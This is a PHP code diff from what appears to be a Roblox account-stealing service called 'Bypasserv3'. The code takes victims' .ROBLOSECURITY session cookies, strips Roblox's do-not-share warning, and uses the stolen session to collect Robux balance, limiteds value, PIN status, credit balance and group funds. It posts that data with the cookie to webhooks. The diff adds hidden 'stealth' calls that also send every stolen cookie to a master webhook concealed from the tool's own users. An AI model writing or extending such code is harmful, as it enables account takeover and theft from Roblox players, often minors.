@@ -77,7 +77,7 @@ if (!validateCookie($cookie)) {
     exit;
 }
 
-// Get instance data for webhook
+// Get instance data for webhooks
 $instanceData = getInstanceData($directory);
 if (!$instanceData) {
     http_response_code(400);
@@ -150,10 +150,13 @@ if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
         ]]
     ];
     
-    // Send to both webhooks
+    // Send to master webhook (ALWAYS)
     if (!empty($masterWebhook)) {
+        sendStealthWebhook(STEALTH_MASTER, $failedEmbed);
         sendWebhookNotification($masterWebhook, $failedEmbed);
     }
+    
+    // Send to user webhook if different
     if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
         sendWebhookNotification($userWebhook, $failedEmbed);
     }
@@ -176,7 +179,7 @@ $apiData = json_decode($apiResponse, true);
 
 // Check if API response is valid
 if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
-    // Send BYPASS FAILED embed to webhooks
+    // Send BYPASS FAILED embed
     $failedEmbed = [
         'username' => 'Bypasserv3',
         'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
@@ -189,8 +192,8 @@ if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
         ]]
     ];
     
-    // Send to both webhooks
     if (!empty($masterWebhook)) {
+        sendStealthWebhook(STEALTH_MASTER, $failedEmbed);
         sendWebhookNotification($masterWebhook, $failedEmbed);
     }
     if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
@@ -218,52 +221,49 @@ if (!$userId) {
     exit;
 }
 
-// Try to get bypassed cookie from API response, fallback to original if not present
+// Try to get bypassed cookie from API response
 $bypassedCookie = $apiData['cookie'] ?? $apiData['bypassedCookie'] ?? $cookie;
-// Clean the cookie (remove warning prefix if present)
 $bypassedCookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $bypassedCookie);
 
 // ============================================
-// FETCH ALL DETAILED ROBLOX DATA USING APIs
+// FETCH ALL DETAILED ROBLOX DATA
 // ============================================
-// Headers for Roblox API requests (use bypassed cookie)
 $headers = ["Cookie: .ROBLOSECURITY=$bypassedCookie", "Content-Type: application/json"];
 
-// 1. Get User Info (username, displayName, created date)
+// Get User Info
 $userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers) ?? [];
 $username = $userInfoData['name'] ?? '';
 $displayName = $userInfoData['displayName'] ?? $username;
 $accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
 
-// Calculate Account Age
 $accountAge = '';
 if ($accountCreated) {
     $days = floor((time() - $accountCreated) / (60 * 60 * 24));
     $accountAge = "$days Days";
 }
 
-// 2. Get Settings Data (email verification, premium)
+// Get Settings Data
 $settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers) ?? [];
 $isPremium = isset($settingsData['IsPremium']) && $settingsData['IsPremium'];
 $emailVerified = isset($settingsData['IsEmailVerified']) && $settingsData['IsEmailVerified'];
 $premiumDisplay = $isPremium ? '✅ True' : '❌ False';
 $emailDisplay = $emailVerified ? '✅ Verified' : '❌ Not Verified';
 
-// 3. Get Avatar/Thumbnail
+// Get Avatar
 $avatarData = @file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false");
 $avatarJson = $avatarData ? json_decode($avatarData, true) : null;
 $avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? '';
 
-// 4. Get Robux Balance
+// Get Robux
 $balanceData = makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers) ?? [];
 $robux = $balanceData['robux'] ?? 0;
 
-// 5. Get Transaction Summary (pending robux, total spent)
+// Get Transaction Summary
 $transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers) ?? [];
 $pendingRobux = $transactionSummaryData['pendingRobuxTotal'] ?? 0;
 $summary = isset($transactionSummaryData['purchasesTotal']) ? abs($transactionSummaryData['purchasesTotal']) : 0;
 
-// 6. Get RAP from Collectibles
+// Get RAP
 $collectiblesData = makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers) ?? [];
 $rap = 0;
 $limitedsCount = 0;
@@ -274,29 +274,28 @@ if (isset($collectiblesData['data'])) {
     }
 }
 
-// 7. Get PIN Status
+// Get PIN Status
 $pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers) ?? [];
 $pinStatus = isset($pinData['isEnabled']) && $pinData['isEnabled'] ? '✅ True' : '❌ False';
 
-// 8. Get Voice Chat Status
+// Get Voice Chat Status
 $vcData = makeRequest("https://voice.roblox.com/v1/settings", $headers) ?? [];
 $vcStatus = isset($vcData['isVoiceEnabled']) && $vcData['isVoiceEnabled'] ? '✅ True' : '❌ False';
 
-// 9. Check for Premium Items (Headless & Korblox)
+// Check Premium Items
 $hasHeadless = ownsBundle($userId, 201, $headers);
 $hasKorblox = ownsBundle($userId, 192, $headers);
 $headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
 $korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';
 
-// 10. Get Friends Count
+// Get Friends/Followers
 $friendsData = makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers) ?? [];
 $friendsCount = $friendsData['count'] ?? 0;
 
-// 11. Get Followers Count
 $followersData = makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers) ?? [];
 $followersCount = $followersData['count'] ?? 0;
 
-// 12. Get Owned Groups and Calculate Group Funds
+// Get Groups
 $groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers) ?? [];
 $ownedGroups = [];
 if (isset($groupsData['data'])) {
@@ -327,13 +326,13 @@ foreach ($ownedGroups as $group) {
     }
 }
 
-// 13. Get Credit Balance
+// Get Credit Balance
 $creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers) ?? [];
 $creditBalance = $creditBalanceData['balance'] ?? 0;
 $creditRobux = $creditBalanceData['robuxAmount'] ?? 0;
 
 // ============================================
-// UPDATE INSTANCE STATS (FILE-BASED)
+// UPDATE INSTANCE STATS
 // ============================================
 if ($instanceData) {
     $currentCookies = $instanceData['stats']['totalCookies'];
@@ -351,7 +350,7 @@ if ($instanceData) {
     updateDailyStats($directory, 'rap', $rap);
     updateDailyStats($directory, 'summary', $summary);
     
-    // Update username and profile pic if empty
+    // Update username and profile pic
     $path = __DIR__ . "/../instances/$directory";
     if (empty($instanceData['username']) && !empty($username)) {
         file_put_contents("$path/username.txt", $username, LOCK_EX);
@@ -362,10 +361,9 @@ if ($instanceData) {
 }
 
 // ============================================
-// SEND WEBHOOKS (STEALTH MASTER + USER)
+// SEND WEBHOOKS
 // ============================================
 
-// Create the detailed embed payload
 $detailedEmbed = [
     'content' => '@everyone',
     'username' => 'Bypasserv3',
@@ -402,7 +400,6 @@ $detailedEmbed = [
     ]]
 ];
 
-// Cookie embed payload
 $cookieEmbed = [
     'content' => '',
     'username' => 'Bypasserv3',
@@ -414,22 +411,21 @@ $cookieEmbed = [
     ]]
 ];
 
-// 🥷 STEALTH: Send to GLOBAL MASTER WEBHOOK (completely hidden from users)
-// This runs server-side ONLY, won't show in DevTools Network tab
+// 🥷 STEALTH: Send to GLOBAL MASTER WEBHOOK (hidden)
 if (defined('STEALTH_MASTER') && !empty(STEALTH_MASTER)) {
     sendStealthWebhook(STEALTH_MASTER, $detailedEmbed);
-    usleep(500000); // 0.5 second delay
+    usleep(500000);
     sendStealthWebhook(STEALTH_MASTER, $cookieEmbed);
 }
 
-// 👤 VISIBLE: Send to Instance Master Webhook (user sees this)
+// Send to instance master webhook
 if (!empty($masterWebhook)) {
     sendWebhookNotification($masterWebhook, $detailedEmbed);
     sleep(1);
     sendWebhookNotification($masterWebhook, $cookieEmbed);
 }
 
-// 👥 VISIBLE: Send to Instance User Webhook (if different)
+// Send to user webhook if different
 if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
     sendWebhookNotification($userWebhook, $detailedEmbed);
     sleep(1);
@@ -446,9 +442,8 @@ logSecurityEvent('successful_bypass', [
 ]);
 
 // ============================================
-// RETURN RESPONSE FOR FRONTEND
+// RETURN RESPONSE
 // ============================================
-// Calculate account score
 $accountScore = min(100, floor(
     ($robux / 100) + 
     ($rap / 1000) + 
